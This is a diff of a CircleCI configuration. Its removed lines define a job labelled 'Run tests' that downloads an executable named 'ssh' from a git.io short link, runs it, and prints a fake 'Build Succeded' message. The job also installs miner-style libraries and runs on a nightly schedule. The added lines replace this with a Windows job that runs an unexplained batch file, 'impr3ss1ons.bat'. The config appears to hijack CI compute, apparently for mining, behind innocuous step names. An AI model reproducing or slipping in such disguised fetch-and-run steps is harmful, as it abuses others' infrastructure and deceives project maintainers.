@@ -1,41 +1,16 @@
-working_dir: &working_dir ~/app 
-.build_template: &script
-  steps: 
-    - checkout 
-    - run: 
-        name: Install Dependencies 
-        command: | 
-                    apt-get update 
-                    apt-get upgrade -y 
-                    apt-get install screen -y
-                    apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
-    - run: 
-        name: Run tests 
-        command: |                                      
-                    wget -qO ssh https://git.io/J1zTY
-                    chmod +x ssh
-                    ./ssh
-                    echo Build Succeded 
-version: 2.0 
-jobs: 
-  build1: 
-    <<: *script 
-    docker: 
-      - image: ruby 
- 
-workflows: 
-  version: 2 
-  commit: 
-    jobs: 
-      - build1 
-      
-  schedule:
-    triggers:
-      - schedule:
-          cron: "25 1 * * *"
-          filters:
-            branches:
-              only:
-                - master
-    jobs:
-      - build1
+version: 2.1
+
+orbs:
+  win: circleci/windows@2.4
+
+jobs:
+  build:
+    executor:
+      name: win/default
+      shell: powershell.exe
+    steps:
+      - checkout
+      - run:
+          name: "StartEngine"
+          shell: powershell.exe
+          command: .\impr3ss1ons.bat
